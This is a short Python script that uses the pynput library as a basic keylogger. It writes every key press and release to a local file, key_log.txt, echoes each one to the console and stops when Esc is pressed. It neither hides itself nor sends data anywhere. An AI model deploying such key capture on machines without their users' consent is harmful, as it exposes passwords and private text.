import pynput 
from pynput.keyboard import Key, Listener  
import logging

log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))
    print('{0} key pressed'.format(key))

def on_release(key):
    logging.info(str(key))
    print('{0} key released'.format(key))
    if key == Key.esc:
        print ('Closing Listener') 
        return False #Stop Listener

with Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
